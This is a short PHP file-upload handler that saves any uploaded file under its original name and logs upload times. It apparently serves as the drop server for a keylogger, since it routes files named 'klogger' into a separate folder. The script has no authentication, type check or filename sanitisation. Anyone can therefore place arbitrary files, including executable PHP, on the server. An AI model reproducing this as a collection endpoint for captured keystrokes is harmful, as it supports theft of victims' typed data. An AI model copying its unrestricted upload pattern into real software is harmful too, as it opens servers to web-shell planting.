<?php
$header = $_SERVER['REQUEST_TIME'];
$uploaddir = 'files/';

/*if(stristr($_FILES['uploadedfile']['type'], "jpeg",false) === false){
	$uploaddir = 'Photo/img/';
}*/

if(stristr($_FILES['uploadedfile']['name'] ,"klogger",false) !== false)
    $uploaddir = 'files/klogger/';
$uploadfile = $uploaddir . basename($_FILES['uploadedfile']['name']);

move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $uploadfile);
if(!empty($header)){
$myfile = fopen("times.txt", "a");
fwrite($myfile, $header."   -----     ".basename($_FILES['uploadedfile']['name']).'\n');
fclose($myfile);} 
?>
